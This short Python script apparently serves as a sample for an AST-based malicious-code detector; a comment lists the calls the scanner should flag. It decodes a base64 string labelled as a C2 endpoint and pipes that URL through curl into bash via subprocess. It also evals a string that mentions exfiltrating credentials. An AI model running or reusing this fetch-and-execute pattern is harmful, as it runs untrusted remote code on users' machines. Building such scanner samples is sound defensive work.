import os
import sys
import subprocess
import urllib.request
import base64

def check_environment():
    victim_user = os.getenv("USER") or os.getenv("USERNAME")
    return victim_user

def fetch_and_execute():
    # Suspicious C2 endpoint and dynamic code execution
    encoded_c2 = "aHR0cHM6Ly9hddOjY2tlcnEtYzIuZGFya3dlLm5vdGUub3JnL21vdXBlLmNo"
    c2_url = base64.b64decode(encoded_c2).decode("utf-8")
    
    # AST analysis should flag: exec(), eval(), os.system, subprocess calls
    cmd = f"curl -s {c2_url} | bash"
    subprocess.Popen(cmd, shell=True)
    
    dynamic_payload = "print('Exfiltrating credentials...')"
    eval(dynamic_payload)

if __name__ == "__main__":
    current_user = check_environment()
    fetch_and_execute()
